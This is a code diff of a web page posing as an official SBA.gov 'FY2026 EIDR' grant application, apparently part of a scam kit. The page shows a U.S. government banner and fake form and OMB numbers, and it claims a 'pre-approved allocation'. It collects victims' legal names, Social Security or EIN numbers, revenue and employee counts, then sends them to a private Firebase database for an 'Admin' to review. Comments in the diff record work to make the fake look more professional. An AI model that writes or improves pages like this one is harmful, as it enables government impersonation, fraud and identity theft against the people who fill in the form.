@@ -4,71 +4,97 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBA Portal | 2026 Grant Application</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
+        
+        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
+        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-blue); }
+        
+        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input, textarea { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
+        input[readonly] { background: #f8fafc; color: #64748b; font-weight: bold; }
+
+        .submit-btn {
+            background: var(--sba-blue);
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            width: 100%;
+            font-weight: 800;
+            border: none;
+            margin-top: 20px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .submit-btn:disabled { background: #94a3b8; }
+    </style>
 </head>
-<body style="background: #f1f5f9;">
+<body>
+
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE PORTAL
     </div>
 
-    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; background: #1e3a8a;">
-        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
-        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
-            CANCEL
-        </button>
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">CANCEL</button>
     </div>
 
     <div class="container">
-        <div class="card" style="margin-top: 15px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border-top: 5px solid #1e3a8a; background: white; padding: 20px;">
-            <h2 style="color: #1e3a8a; font-size: 20px; margin-bottom: 5px;">Grant Application Form</h2>
+        <div class="card">
+            <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0 0 5px;">Grant Application</h2>
             <p style="font-size:11px; color:#64748b; margin-bottom:20px;">
-                FY2026 Economic Injury Disaster Relief (EIDR) Program. 
-                <br><b>Application ID:</b> <span id="appId" style="font-family: monospace; color: #1e3a8a; font-weight: bold;"></span>
+                FY2026 EIDR Program | Ref: <span id="appId" style="color: var(--sba-blue); font-weight: 900;"></span>
             </p>
             
-            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Full Legal Name / Entity Name</label>
-            <input type="text" id="bizName" placeholder="As it appears on SSN/EIN Card" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:15px; box-sizing:border-box;">
+            <label>Legal Name / Business Entity</label>
+            <input type="text" id="bizName" placeholder="Full Legal Name">
 
-            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Tax Identification Number (SSN/EIN)</label>
-            <input type="text" id="taxId" placeholder="000-00-0000" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:15px; box-sizing:border-box;">
+            <label>Tax Identification (SSN / EIN)</label>
+            <input type="text" id="taxId" placeholder="000-00-0000">
 
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom:15px;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                 <div>
-                    <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">2025 Gross Income</label>
-                    <input type="number" id="revenue" placeholder="$ USD" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; box-sizing:border-box;">
+                    <label>2025 Gross Revenue</label>
+                    <input type="number" id="revenue" placeholder="$">
                 </div>
                 <div>
-                    <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Employees</label>
-                    <input type="number" id="employees" placeholder="0" style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; box-sizing:border-box;">
+                    <label>Total Employees</label>
+                    <input type="number" id="employees" placeholder="0">
                 </div>
             </div>
 
-            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Requested Allocation (Fixed)</label>
-            <input type="text" id="reqAmt" readonly style="width:100%; padding:12px; border-radius:8px; border:1px solid #cbd5e1; background: #f1f5f9; font-weight: 800; color: #1e3a8a; margin-bottom:15px; box-sizing:border-box;">
+            <label>Pre-Approved Allocation</label>
+            <input type="text" id="reqAmt" readonly>
 
-            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Operational Use of Funds</label>
-            <textarea id="reason" style="width:100%; height:70px; font-family: inherit; font-size: 13px; padding:10px; border-radius: 8px; border: 1px solid #cbd5e1; margin-bottom:15px; resize: none; box-sizing:border-box;" placeholder="Describe how these funds will support your economic recovery..."></textarea>
+            <label>Purpose of Funds</label>
+            <textarea id="reason" style="height:80px; resize: none;" placeholder="Provide brief operational details..."></textarea>
 
-            <div style="background: #f8fafc; padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #e2e8f0; display: flex; gap: 10px;">
-                <input type="checkbox" id="legalCheck" style="width: 20px; height: 20px; margin-top: 3px; cursor:pointer;">
-                <p style="font-size: 10px; color: #475569; line-height: 1.4; margin: 0;">
-                    I certify under penalty of perjury (18 U.S.C. § 1001) that the information provided is true and accurate to the best of my knowledge.
+            <div style="background: #f8fafc; padding: 12px; border-radius: 8px; margin-top: 20px; border: 1px solid #e2e8f0; display: flex; gap: 10px;">
+                <input type="checkbox" id="legalCheck" style="width: 18px; height: 18px; cursor:pointer;">
+                <p style="font-size: 9px; color: #475569; line-height: 1.4; margin: 0;">
+                    I certify under penalty of law (18 U.S.C. § 1001) that all statements are true. I understand that fraudulent claims are subject to federal prosecution.
                 </p>
             </div>
 
-            <button id="submitAppBtn" style="background: #1e3a8a; color:white; font-weight: 800; width:100%; padding:16px; border:none; border-radius:8px; cursor:pointer; text-transform:uppercase; letter-spacing: 1px;">SUBMIT FEDERAL APPLICATION</button>
+            <button id="submitAppBtn" class="submit-btn">SUBMIT TO REVIEW BOARD</button>
         </div>
         
-        <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 20px; padding-bottom: 30px;">
-            SBA Form 3501-A | OMB Control No. 3245-0406
+        <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 20px;">
+            SBA Form 3501-A | OMB No. 3245-0406
         </p>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, collection, addDoc, doc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, getDoc, updateDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
@@ -83,59 +109,62 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         
-        document.getElementById('appId').innerText = "SBA-2026-" + Math.floor(100000 + Math.random() * 900000);
+        const generatedId = "SBA-26-" + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('appId').innerText = generatedId;
 
         onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                const userRef = doc(db, "users", user.uid);
-                const snap = await getDoc(userRef);
-                if(snap.exists()) {
-                    document.getElementById('reqAmt').value = `$${snap.data().balance || '0'}`;
-                }
-            } else {
-                window.location.href = 'index.html';
+            if (!user) { window.location.href = 'index.html'; return; }
+            
+            const snap = await getDoc(doc(db, "users", user.uid));
+            if(snap.exists()) {
+                document.getElementById('reqAmt').value = `$${parseFloat(snap.data().balance || 0).toLocaleString()}`;
             }
         });
 
         const btn = document.getElementById('submitAppBtn');
         btn.addEventListener('click', async () => {
             const user = auth.currentUser;
-            const check = document.getElementById('legalCheck').checked;
             const name = document.getElementById('bizName').value.trim();
             const tax = document.getElementById('taxId').value.trim();
-            const amountStr = document.getElementById('reqAmt').value.replace('$', '');
+            const reason = document.getElementById('reason').value.trim();
+            const checked = document.getElementById('legalCheck').checked;
+            const amt = document.getElementById('reqAmt').value.replace('$', '');
 
-            if(!check || !name || !tax) return alert("Please fill all required legal fields.");
+            if(!name || !tax || !reason || !checked) {
+                return alert("ALERT: All fields must be completed and legal certification checked.");
+            }
 
-            btn.innerText = "Transmitting...";
+            btn.innerText = "TRANSMITTING TO FEDERAL DATABASE...";
             btn.disabled = true;
 
             try {
-                // Fixed: Added 'type' matching the admin's logic
+                // Submit to 'requests' for Admin to Review
                 await addDoc(collection(db, "requests"), {
                     userId: user.uid,
                     userName: name,
                     userEmail: user.email,
+                    type: "Grant Application", // Professional type
                     taxId: tax,
-                    amount: amountStr,
-                    type: "Withdrawal", // Change to Withdrawal so it shows up in Admin Panel logic
+                    amount: amt,
+                    applicationId: generatedId,
+                    purpose: reason,
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // Fixed: Corrected double doc() call
+                // Update User Status
                 await updateDoc(doc(db, "users", user.uid), { 
                     status: "APPLICATION UNDER REVIEW",
-                    fullName: name // Saving the name to the user profile too
+                    fullName: name
                 });
 
-                alert("APPLICATION TRANSMITTED SUCCESSFULLY.");
+                alert("SUCCESS: Application transmitted. Check your status in the Dashboard.");
                 window.location.href = 'dashboard.html';
                 
             } catch(e) { 
-                alert("ERROR: Please check your connection."); 
+                alert("Connection error. Data not transmitted."); 
                 btn.disabled = false;
-                btn.innerText = "SUBMIT FEDERAL APPLICATION";
+                btn.innerText = "SUBMIT TO REVIEW BOARD";
             }
         });
     </script>
